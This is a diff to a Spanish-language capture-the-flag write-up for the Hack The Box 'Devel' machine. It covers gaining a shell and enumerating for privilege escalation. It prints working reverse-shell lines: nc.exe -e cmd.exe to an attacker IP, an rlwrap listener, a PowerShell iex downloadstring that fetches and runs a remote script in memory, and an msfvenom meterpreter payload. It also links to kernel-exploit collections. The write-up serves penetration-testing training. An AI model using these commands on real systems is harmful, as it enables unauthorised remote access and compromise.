@@ -76,9 +76,18 @@ copy \\10.10.14.90\smbFolder\archivo
 
 En kali seclist tiene nc.exe
 
+![image](https://github.com/gecr07/Devel-HTB/assets/63270579/809f870c-12bb-4a54-8830-d1925f2a5f38)
+
 
 ```
 \\10.10.14.80\share\nc.exe -e cmd.exe 10.10.14.80 443
+
+```
+
+De lado de kali no te olvides del rlwrap
+
+```
+rlwrap nc -lvnp 443
 
 ```
 
@@ -225,26 +234,92 @@ Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.80 -Port 4444
 
 ![image](https://github.com/gecr07/Devel-HTB/assets/63270579/efb2a3c0-8208-4f8e-a911-8bb0336b5699)
 
+Para descargar y en memoria:
+
+```
+powershell iex(new-object net.webclient).downloadstring('http://10.10.14.14/Invoke-PowerShellTcp.ps1')
+```
+La explicacion es que esto descarga directo a la memoria y pues solo llamas a la funcion que ya definiste.Ojo no se porque pero a mi me funciona mas subirte un nc.exe usarlo con rlwrap ya que el exploit acontinuacion no lanza la consola con privilegios si no es con este metodo considera esto como hacer tu powershell una full tty
+
+![image](https://github.com/gecr07/Devel-HTB/assets/63270579/e6059c3a-c74f-49a7-b525-ec93b555bbc2)
+
+
+otra opcion es usar msfvenom
+
+```
+ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.14 LPORT=443 -f aspx > met_rev_443.aspx
+```
+
+Cosa que no recomiendo por que en la oscp no lo dejan
+
+
+##  Priv Esc
+
+Empezamos a enumerar y me doy cuenta que no tiene parches instalados podemos ver esto con:
+
+```
+systeminfo
+```
+
+![image](https://github.com/gecr07/Devel-HTB/assets/63270579/de0d290c-c025-49db-a422-16e6a4fd3540)
+
+Y en español 
+
+![image](https://github.com/gecr07/Devel-HTB/assets/63270579/42ea364f-b71a-4045-93c5-7ae71145390c)
 
 
 
+> https://0xdf.gitlab.io/2019/03/05/htb-devel.html
 
 
+## Watson exploit suggerster
+
+![image](https://github.com/gecr07/Devel-HTB/assets/63270579/e7709e7b-8a3b-479e-8ce7-731270ac33db)
 
 
+Pues ya esta descontinuado desde el 2021.
+
+> https://github.com/rasta-mouse/Watson
+
+## Enumerar los Net Frameworks
+
+Para saber si compilamos un proyecto y que Net Framework se puede compilar hay dos vias por el reg query y visitando la carpeta. Ojo la del reg por lo que entendi te muestra la version mas alta que se tenga instalado.
+
+```
+reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"
+```
 
 
+Por otra parte ver la carpeta si muestra todos los que estan instalados.
+
+```
+c:\Windows\Microsoft.NET\Framework>dir /A:D
+dir solo mostrara los directorios para esa es la opcion D
+```
 
 
+![image](https://github.com/gecr07/Devel-HTB/assets/63270579/a97eaed5-a73a-466b-a6ff-f88da84beee6)
+
+Se puede usar metasploit 
+
+![image](https://github.com/gecr07/Devel-HTB/assets/63270579/d0b465b7-597f-463f-8ed8-3e3f3c5b3dbf)
 
 
+Pero con la pura info del systeminfo.
+
+![image](https://github.com/gecr07/Devel-HTB/assets/63270579/b7304e13-7186-4cfb-be92-c682ed44aad8)
 
 
+![image](https://github.com/gecr07/Devel-HTB/assets/63270579/dcfbaf29-b182-4bab-ad0a-67ee68fd1aa7)
 
 
+Las paginas para los exploits que tienen muchos exploits son
 
+> https://github.com/abatchy17/WindowsExploits
 
+> https://github.com/SecWiki/windows-kernel-exploits
 
+![image](https://github.com/gecr07/Devel-HTB/assets/63270579/1b11799b-6b79-41bb-97b6-29513d6e2c80)
 
 
 
